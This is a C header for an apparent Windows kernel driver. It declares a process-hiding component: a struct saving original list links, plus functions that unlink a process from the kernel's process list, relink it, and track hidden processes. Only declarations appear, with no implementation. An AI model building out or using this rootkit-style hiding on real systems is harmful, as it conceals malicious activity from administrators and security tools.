#pragma once
#include "definitions.h"
#include "memory.h"
#include "shared.h"

#ifdef __cplusplus
extern "C" {
#endif

typedef struct _HIDDEN_PROCESS {
    LIST_ENTRY listEntry;
    HANDLE processId;
    PEPROCESS process;
    LIST_ENTRY originalFlink;
    LIST_ENTRY originalBlink;
    BOOLEAN isUnlinked;
} HIDDEN_PROCESS, *PHIDDEN_PROCESS;

extern LIST_ENTRY g_HiddenProcessList;
extern KSPIN_LOCK g_HiddenProcessLock;
extern BOOLEAN g_ProcessHidingInitialized;

BOOLEAN InitializeProcessHider();
VOID CleanupProcessHider();
NTSTATUS HideProcess(HANDLE ProcessId);
NTSTATUS UnhideProcess(HANDLE ProcessId);
BOOLEAN IsProcessHidden(HANDLE ProcessId);
NTSTATUS UnlinkFromProcessList(PEPROCESS Process, PLIST_ENTRY OriginalFlink, PLIST_ENTRY OriginalBlink);
NTSTATUS LinkToProcessList(PEPROCESS Process, PLIST_ENTRY OriginalFlink, PLIST_ENTRY OriginalBlink);
VOID RegisterProcessNotifyCallback();
VOID UnregisterProcessNotifyCallback();
PHIDDEN_PROCESS FindHiddenProcess(HANDLE ProcessId);
VOID AddHiddenProcess(HANDLE ProcessId, PEPROCESS Process, PLIST_ENTRY OriginalFlink, PLIST_ENTRY OriginalBlink);
VOID RemoveHiddenProcess(HANDLE ProcessId);

#ifdef __cplusplus
}
#endif
